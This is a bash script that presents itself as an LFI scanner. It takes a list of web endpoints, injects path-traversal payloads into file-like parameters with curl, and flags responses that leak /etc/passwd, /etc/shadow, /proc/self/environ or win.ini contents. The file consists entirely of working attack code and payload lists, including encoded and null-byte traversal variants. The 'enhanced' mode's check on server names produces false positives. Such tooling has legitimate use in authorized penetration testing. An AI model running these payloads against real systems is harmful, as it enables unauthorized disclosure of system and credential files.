#!/bin/bash

# LFI Vulnerability Scanner
# Usage: ./lfi_scanner.sh <endpoints_file> [output_file]

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
echo "   __    ____  ______"
echo "  / /   / __ \/  _/ /   "
echo " / /   / /_/ // // /    "
echo "/ /___/ _, _// // /___  "
echo "/_____/_/ |_/___/_____/  LFI Scanner"
echo -e "${NC}"
echo ""

# Check if input file is provided
if [ $# -lt 1 ]; then
    echo "Usage: $0 <endpoints_file> [output_file]"
    echo "Example: $0 endpoints.txt results.txt"
    exit 1
fi

INPUT_FILE="$1"
OUTPUT_FILE="${2:-lfi_results.txt}"

# Check if input file exists
if [ ! -f "$INPUT_FILE" ]; then
    echo -e "${RED}Error: Input file '$INPUT_FILE' not found${NC}"
    exit 1
fi

# Common LFI parameters and patterns
LFI_PARAMS=("file" "page" "path" "load" "template" "include" "doc" "view" "filename" "document" "folder" "style" "pdf" "template" "pg")
LFI_PATTERNS=("/etc/passwd" "/etc/hosts" "/etc/shadow" "/proc/self/environ" "/proc/version" "../../../../etc/passwd" "....//....//....//....//etc/passwd")

# Payloads to test
PAYLOADS=(
    "../../../../etc/passwd"
    "../../../../etc/passwd%00"
    "....//....//....//....//etc/passwd"
    "....//....//....//....//etc/passwd%00"
    "/etc/passwd"
    "/etc/passwd%00"
    "../../../../windows/win.ini"
    "....//....//....//....//windows/win.ini"
    "/proc/self/environ"
    "../../../../proc/self/environ"
    "/etc/hosts"
    "../../../../etc/hosts"
)

# Function to check if URL contains LFI patterns
check_lfi_patterns() {
    local url="$1"
    
    for pattern in "${LFI_PATTERNS[@]}"; do
        if echo "$url" | grep -q "$pattern"; then
            return 0
        fi
    done
    return 1
}

# Function to test LFI vulnerability
test_lfi() {
    local url="$1"
    local output_file="$2"
    
    # Check if URL already contains LFI patterns
    if check_lfi_patterns "$url"; then
        echo -e "${YELLOW}[INFO]${NC} Potential LFI pattern found: $url"
        echo "$url" >> "$output_file"
        return
    fi
    
    # Extract base URL and parameters
    local base_url=$(echo "$url" | cut -d'?' -f1)
    local query_string=$(echo "$url" | cut -d'?' -f2-)
    
    # If no parameters, skip
    if [ "$query_string" == "$url" ]; then
        return
    fi
    
    # Parse parameters and test each one
    IFS='&' read -ra PARAMS <<< "$query_string"
    
    for param_pair in "${PARAMS[@]}"; do
        local param_name=$(echo "$param_pair" | cut -d'=' -f1)
        local param_value=$(echo "$param_pair" | cut -d'=' -f2-)
        
        # Check if parameter is in our LFI list
        for lfi_param in "${LFI_PARAMS[@]}"; do
            if [[ "$param_name" == *"$lfi_param"* ]]; then
                echo -e "${BLUE}[TESTING]${NC} Testing parameter: $param_name in $base_url"
                
                # Test each payload
                for payload in "${PAYLOADS[@]}"; do
                    local test_url="${base_url}?${param_name}=${payload}"
                    
                    # Make the request and check for common LFI indicators
                    local response=$(curl -s -k -L --connect-timeout 10 --max-time 15 "$test_url" 2>/dev/null || true)
                    
                    if echo "$response" | grep -q "root:"; then
                        echo -e "${GREEN}[VULNERABLE]${NC} LFI found: $test_url"
                        echo "$test_url" >> "$output_file"
                        break 2
                    elif echo "$response" | grep -q "for 16-bit app support"; then
                        echo -e "${GREEN}[VULNERABLE]${NC} LFI found (Windows): $test_url"
                        echo "$test_url" >> "$output_file"
                        break 2
                    elif echo "$response" | grep -q "DOCUMENT_ROOT="; then
                        echo -e "${GREEN}[VULNERABLE]${NC} LFI found (proc): $test_url"
                        echo "$test_url" >> "$output_file"
                        break 2
                    fi
                done
            fi
        done
    done
}

# Function to clean and normalize URLs
clean_urls() {
    local input_file="$1"
    local temp_file=$(mktemp)
    
    # Remove duplicates and normalize URLs
    cat "$input_file" | sort -u | \
    grep -E "\.(php|asp|aspx|jsp|html|htm|pl|py|rb|cfm|shtml)" | \
    grep "?" > "$temp_file"
    
    echo "$temp_file"
}

# Main scanning function
main() {
    echo -e "${BLUE}[INFO]${NC} Starting LFI scan..."
    echo -e "${BLUE}[INFO]${NC} Input file: $INPUT_FILE"
    echo -e "${BLUE}[INFO]${NC} Output file: $OUTPUT_FILE"
    echo -e "${BLUE}[INFO]${NC} Total endpoints to process: $(wc -l < "$INPUT_FILE")"
    echo ""
    
    # Clean URLs
    echo -e "${YELLOW}[CLEANING]${NC} Cleaning and filtering URLs..."
    CLEANED_FILE=$(clean_urls "$INPUT_FILE")
    echo -e "${YELLOW}[CLEANING]${NC} Filtered endpoints: $(wc -l < "$CLEANED_FILE")"
    echo ""
    
    # Initialize output file
    > "$OUTPUT_FILE"
    
    # Counter
    count=0
    total=$(wc -l < "$CLEANED_FILE")
    
    # Process each URL
    while IFS= read -r url; do
        ((count++))
        echo -e "${BLUE}[PROGRESS]${NC} Processing $count/$total: $url"
        test_lfi "$url" "$OUTPUT_FILE"
    done < "$CLEANED_FILE"
    
    # Cleanup
    rm -f "$CLEANED_FILE"
    
    # Results summary
    echo ""
    echo -e "${GREEN}[COMPLETED]${NC} Scan completed!"
    echo -e "${GREEN}[RESULTS]${NC} Potential LFI vulnerabilities found: $(wc -l < "$OUTPUT_FILE" 2>/dev/null || echo 0)"
    echo -e "${GREEN}[OUTPUT]${NC} Results saved to: $OUTPUT_FILE"
}

# Enhanced version with more payloads and techniques
enhanced_lfi_scan() {
    local url_file="$1"
    local output_file="$2"
    
    echo -e "${BLUE}[ENHANCED]${NC} Running enhanced LFI scan..."
    
    # Additional techniques: null byte, double encoding, path traversal variations
    ENHANCED_PAYLOADS=(
        "../../../../etc/passwd"
        "../../../../etc/passwd%00"
        "../../../../etc/passwd%2500"
        "....//....//....//....//etc/passwd"
        "....\/....\/....\/....\/etc/passwd"
        "..\\..\\..\\..\\etc\\passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "....////....////....////....////etc/passwd"
        "/etc/passwd"
        "/etc/passwd%00"
        "../../../../windows/win.ini"
        "..\\..\\..\\..\\windows\\win.ini"
        "/proc/self/environ"
        "../../../../proc/self/environ"
        "/etc/hosts"
        "../../../../etc/hosts"
        "/etc/shadow"
        "../../../../etc/shadow"
        "/etc/group"
        "../../../../etc/group"
        "/var/www/html/index.php"
        "../../../../var/www/html/index.php"
    )
    
    while IFS= read -r url; do
        # Test each enhanced payload
        for payload in "${ENHANCED_PAYLOADS[@]}"; do
            # Replace parameter values with payloads
            if echo "$url" | grep -q "="; then
                base_url=$(echo "$url" | cut -d'?' -f1)
                query_string=$(echo "$url" | cut -d'?' -f2-)
                
                IFS='&' read -ra PARAMS <<< "$query_string"
                new_params=()
                
                for param_pair in "${PARAMS[@]}"; do
                    param_name=$(echo "$param_pair" | cut -d'=' -f1)
                    new_params+=("${param_name}=${payload}")
                done
                
                test_url="${base_url}?$(IFS='&'; echo "${new_params[*]}")"
                
                # Test the URL
                response=$(curl -s -k -L --connect-timeout 10 --max-time 15 "$test_url" 2>/dev/null || true)
                
                # Check for success indicators
                if echo "$response" | grep -q -E "(root:|admin:|nobody:)|(for 16-bit app support)|(DOCUMENT_ROOT=|PATH=)|(Apache|nginx)"; then
                    echo -e "${GREEN}[VULNERABLE]${NC} Enhanced LFI: $test_url"
                    echo "$test_url" >> "${output_file}_enhanced"
                fi
            fi
        done
    done < "$url_file"
}

# Run main scan
main "$INPUT_FILE" "$OUTPUT_FILE"

# Optionally run enhanced scan
echo ""
read -p "Run enhanced LFI scan? (y/n): " -n 1 -r
echo ""
if [[ $REPLY =~ ^[Yy]$ ]]; then
    enhanced_lfi_scan "$INPUT_FILE" "$OUTPUT_FILE"
fi

echo -e "${GREEN}[DONE]${NC} All scans completed!"